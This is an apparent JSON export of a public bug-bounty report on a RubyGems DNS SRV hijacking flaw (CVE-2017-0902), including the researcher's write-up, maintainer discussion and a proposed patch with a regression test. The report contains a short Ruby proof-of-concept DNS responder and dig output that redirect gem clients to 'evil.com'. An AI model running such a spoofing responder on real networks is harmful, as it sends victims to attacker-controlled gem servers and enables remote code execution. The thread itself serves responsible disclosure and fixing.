@@ -1,0 +1,712 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "sp1d3rs", 
+        "jobert", 
+        "ysx", 
+        "claudijd", 
+        "eveeez", 
+        "geeknik", 
+        "axolotl", 
+        "marwan", 
+        "corycomplex", 
+        "sonalkr132"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 218088, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-08-28T16:41:24.208Z", 
+    "vulnerability_information": "**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned \nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\t\n    RubyDNS::run_server(:listen => INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Recommendations:**\n\nConsider this small patch to address the immediate attack vector...\n\n    -      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n    +      if (/\\.#{Regexp.quote(host)}\\z/ =~ target) && !target.include?(\"/\")\n\nAlso, consider moving away from doing API discovery via DNS.  Would recommend \nmoving to HTTPS, where you will have a stronger transport security chain.\n\n**References (these are not new, just references prior work here to help triage team understand impact):**\n\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\n- https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\n- http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier", 
+    "is_member_of_team?": null, 
+    "vote_count": 10, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-09-27T16:41:24.243Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2017-0902"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,000", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": true, 
+            "created_at": "2017-04-02T17:31:06.102Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-02T17:31:06.102Z", 
+            "actor": {
+                "url": "/rubygems", 
+                "profile": {
+                    "name": "RubyGems"
+                }, 
+                "ibb": true, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/212/fb193d1c05feff770bc8d4a69e09613b5f9f4c3d_medium.png?1469676240"
+                }
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.", 
+            "markdown_message": "<p>Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1579173, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-10T19:05:04.416Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-10T19:05:04.416Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Any update on this issue?", 
+            "markdown_message": "<p>Any update on this issue?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1603236, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-10T19:16:24.562Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-10T19:16:49.969Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Also, regarding recommendations, you may also consider defining a white-list of acceptable characters that fit just hostnames (this would eliminate other possible evasion techniques, like ? or #).  This would be preferred over simply black-listing \"/\" as I suggested above.", 
+            "markdown_message": "<p>Also, regarding recommendations, you may also consider defining a white-list of acceptable characters that fit just hostnames (this would eliminate other possible evasion techniques, like ? or #).  This would be preferred over simply black-listing &quot;/&quot; as I suggested above.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1603274, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-10T19:26:11.750Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-10T19:26:11.750Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "I guess we could also parse the target as a URI and check if its host end with the given host?", 
+            "markdown_message": "<p>I guess we could also parse the target as a URI and check if its host end with the given host?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1603300, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-10T19:45:09.225Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-10T19:47:30.590Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "@segiddins target in this context should be a hostname and not a URI.  If you parse with URI without specifying a scheme, I think host/hostname will be nil...\n\n    2.2.3 :012 > target\n     => \"evil.com/api.rubygems.org\" \n    2.2.3 :013 > uri = URI(target).host\n     => nil \n    2.2.3 :014 > uri = URI(target).hostname\n     => nil \n    2.2.3 :015 > uri = URI(\"https://\" + target).hostname\n     => \"evil.com\"\n\nBut, in essence, I think that would solve the issue on faking out the host regex.\n\n\n", 
+            "markdown_message": "<p><a href=\"/segiddins\">@segiddins</a> target in this context should be a hostname and not a URI.  If you parse with URI without specifying a scheme, I think host/hostname will be nil...</p>\n<pre class=\"highlight plaintext\"><code>2.2.3 :012 &gt; target\n =&gt; &quot;evil.com/api.rubygems.org&quot; \n2.2.3 :013 &gt; uri = URI(target).host\n =&gt; nil \n2.2.3 :014 &gt; uri = URI(target).hostname\n =&gt; nil \n2.2.3 :015 &gt; uri = URI(&quot;https://&quot; + target).hostname\n =&gt; &quot;evil.com&quot;\n</code></pre>\n<p>But, in essence, I think that would solve the issue on faking out the host regex.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1603360, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-10T19:52:34.665Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-10T19:52:47.518Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Here's a couple other use cases I could think of to test out the URI parsing strategy...\n\n    2.2.3 :020 > URI(\"https://\" + \"evil.com/api.rubygems.org\").hostname\n     => \"evil.com\" \n    2.2.3 :021 > URI(\"https://\" + \"evil.com?api.rubygems.org\").hostname\n     => \"evil.com\" \n    2.2.3 :022 > URI(\"https://\" + \"evil.com#api.rubygems.org\").hostname\n     => \"evil.com\"\n\nThey all look good to me.", 
+            "markdown_message": "<p>Here&#39;s a couple other use cases I could think of to test out the URI parsing strategy...</p>\n<pre class=\"highlight plaintext\"><code>2.2.3 :020 &gt; URI(&quot;https://&quot; + &quot;evil.com/api.rubygems.org&quot;).hostname\n =&gt; &quot;evil.com&quot; \n2.2.3 :021 &gt; URI(&quot;https://&quot; + &quot;evil.com?api.rubygems.org&quot;).hostname\n =&gt; &quot;evil.com&quot; \n2.2.3 :022 &gt; URI(&quot;https://&quot; + &quot;evil.com#api.rubygems.org&quot;).hostname\n =&gt; &quot;evil.com&quot;\n</code></pre>\n<p>They all look good to me.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1603381, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-24T18:21:34.641Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-24T18:21:34.641Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "It's been about 3 weeks since the initial report.  Is there a sense for when a fixed release for this might be able to the public?", 
+            "markdown_message": "<p>It&#39;s been about 3 weeks since the initial report.  Is there a sense for when a fixed release for this might be able to the public?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1631625, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-01T17:14:37.417Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-01T17:14:58.497Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Whenever someone makes the fix? I'll try and do this if no one beats me to it...", 
+            "markdown_message": "<p>Whenever someone makes the fix? I&#39;ll try and do this if no one beats me to it...</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1646785, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-01T17:21:59.685Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-01T17:21:59.685Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "If this is sufficient...\n\n```diff\ndiff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n--- a/lib/rubygems/remote_fetcher.rb\n+++ b/lib/rubygems/remote_fetcher.rb\n@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n \n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if URI(\"http://\" + target).hostname.end_with?(\".#{host}\")\n         return URI.parse \"#{uri.scheme}://#{target}#{uri.path}\"\n       end\n \ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n--- a/test/rubygems/test_gem_remote_fetcher.rb\n+++ b/test/rubygems/test_gem_remote_fetcher.rb\n@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n \n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse \"http://example.com/foo\"\n+    target = MiniTest::Mock.new\n+    target.expect :target, \"evil.com/a.example.com\"\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\"http://example.com/foo\"), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n   def test_api_endpoint_timeout_warning\n     uri = URI.parse \"http://gems.example.com/foo\"\n \n\n```", 
+            "markdown_message": "<p>If this is sufficient...</p>\n<pre class=\"highlight diff\"><code><span class=\"gh\">diff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n</span><span class=\"gd\">--- a/lib/rubygems/remote_fetcher.rb\n</span><span class=\"gi\">+++ b/lib/rubygems/remote_fetcher.rb\n</span><span class=\"gu\">@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n</span>     else\n       target = res.target.to_s.strip\n\n<span class=\"gd\">-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n</span><span class=\"gi\">+      if URI(&quot;http://&quot; + target).hostname.end_with?(&quot;.#{host}&quot;)\n</span>         return URI.parse &quot;#{uri.scheme}://#{target}#{uri.path}&quot;\n       end\n\n<span class=\"gh\">diff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n</span><span class=\"gd\">--- a/test/rubygems/test_gem_remote_fetcher.rb\n</span><span class=\"gi\">+++ b/test/rubygems/test_gem_remote_fetcher.rb\n</span><span class=\"gu\">@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n</span>     dns.verify\n   end\n\n<span class=\"gi\">+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse &quot;http://example.com/foo&quot;\n+    target = MiniTest::Mock.new\n+    target.expect :target, &quot;evil.com/a.example.com&quot;\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(&quot;http://example.com/foo&quot;), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n</span>   def test_api_endpoint_timeout_warning\n     uri = URI.parse &quot;http://gems.example.com/foo&quot;\n\n\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 1646793, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-01T17:45:32.466Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-01T17:45:32.466Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "This is the proposed patch atop v2.6.12\n\n```patch\nFrom 16d44ce98a2a26bd02b35d1fe49056a1e7a865da Mon Sep 17 00:00:00 2001\nFrom: Samuel Giddins <segiddins@segiddins.me>\nDate: Mon, 1 May 2017 12:41:29 -0500\nSubject: [PATCH] [RemoteFetcher] Avoid DNS Hijacking Vulnerability\n\nReported by @claudijd\n\n**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned\nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\n    RubyDNS::run_server(:listen => INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Fix:**\n\nBy parsing the returned target as a URI and only matching against the\n`hostname`, we can ensure that only subdomains of the original host\nare redirected to. This way, adding URI-delimiting characters to the\n`target` cannot be used to front-pad the target, creating a\nfalse-positive match.\n---\n lib/rubygems/remote_fetcher.rb           |  2 +-\n test/rubygems/test_gem_remote_fetcher.rb | 15 +++++++++++++++\n 2 files changed, 16 insertions(+), 1 deletion(-)\n\ndiff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n--- a/lib/rubygems/remote_fetcher.rb\n+++ b/lib/rubygems/remote_fetcher.rb\n@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n \n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if URI(\"http://\" + target).hostname.end_with?(\".#{host}\")\n         return URI.parse \"#{uri.scheme}://#{target}#{uri.path}\"\n       end\n \ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n--- a/test/rubygems/test_gem_remote_fetcher.rb\n+++ b/test/rubygems/test_gem_remote_fetcher.rb\n@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n \n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse \"http://example.com/foo\"\n+    target = MiniTest::Mock.new\n+    target.expect :target, \"evil.com/a.example.com\"\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\"http://example.com/foo\"), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n   def test_api_endpoint_timeout_warning\n     uri = URI.parse \"http://gems.example.com/foo\"\n \n-- \n2.11.0\n```", 
+            "markdown_message": "<p>This is the proposed patch atop v2.6.12</p>\n<pre class=\"highlight diff\"><code>From 16d44ce98a2a26bd02b35d1fe49056a1e7a865da Mon Sep 17 00:00:00 2001\nFrom: Samuel Giddins &lt;segiddins@segiddins.me&gt;\nDate: Mon, 1 May 2017 12:41:29 -0500\nSubject: [PATCH] [RemoteFetcher] Avoid DNS Hijacking Vulnerability\n\nReported by [@claudijd](/claudijd)\n\n**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with &quot;_rubygems._tcp.&quot;.\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned\nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his &quot;Hacking with\nGems&quot; presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require &#39;rubydns&#39;\n    require &#39;rubydns/system&#39;\n    INTERFACES = [\n        [:udp, &quot;0.0.0.0&quot;, 53],\n        [:tcp, &quot;0.0.0.0&quot;, 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\n    RubyDNS::run_server(:listen =&gt; INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,&quot;evil.com/api.rubygems.com&quot;)\n      end\n    end\n\n**Fix:**\n\nBy parsing the returned target as a URI and only matching against the\n`hostname`, we can ensure that only subdomains of the original host\nare redirected to. This way, adding URI-delimiting characters to the\n`target` cannot be used to front-pad the target, creating a\nfalse-positive match.\n---\n lib/rubygems/remote_fetcher.rb           |  2 +-\n test/rubygems/test_gem_remote_fetcher.rb | 15 +++++++++++++++\n 2 files changed, 16 insertions(+), 1 deletion(-)\n\n<span class=\"gh\">diff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n</span><span class=\"gd\">--- a/lib/rubygems/remote_fetcher.rb\n</span><span class=\"gi\">+++ b/lib/rubygems/remote_fetcher.rb\n</span><span class=\"gu\">@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n</span>     else\n       target = res.target.to_s.strip\n\n<span class=\"gd\">-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n</span><span class=\"gi\">+      if URI(&quot;http://&quot; + target).hostname.end_with?(&quot;.#{host}&quot;)\n</span>         return URI.parse &quot;#{uri.scheme}://#{target}#{uri.path}&quot;\n       end\n\n<span class=\"gh\">diff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n</span><span class=\"gd\">--- a/test/rubygems/test_gem_remote_fetcher.rb\n</span><span class=\"gi\">+++ b/test/rubygems/test_gem_remote_fetcher.rb\n</span><span class=\"gu\">@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n</span>     dns.verify\n   end\n\n<span class=\"gi\">+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse &quot;http://example.com/foo&quot;\n+    target = MiniTest::Mock.new\n+    target.expect :target, &quot;evil.com/a.example.com&quot;\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(&quot;http://example.com/foo&quot;), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n</span>   def test_api_endpoint_timeout_warning\n     uri = URI.parse &quot;http://gems.example.com/foo&quot;\n\n<span class=\"gd\">-- \n</span>2.11.0\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 1646895, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-03T14:59:33.364Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-03T14:59:33.364Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "@segiddins my apologies, I would have totally written the patch and tests for this based on our prior discussion.  I've reviewed the patch you've created and believe it's sufficient to address this issue.  In the future, for security related issues, would you prefer I send a PR or is including the patch diff here the preferred medium?", 
+            "markdown_message": "<p><a href=\"/segiddins\">@segiddins</a> my apologies, I would have totally written the patch and tests for this based on our prior discussion.  I&#39;ve reviewed the patch you&#39;ve created and believe it&#39;s sufficient to address this issue.  In the future, for security related issues, would you prefer I send a PR or is including the patch diff here the preferred medium?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1651572, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-03T16:29:55.782Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-03T16:29:55.782Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
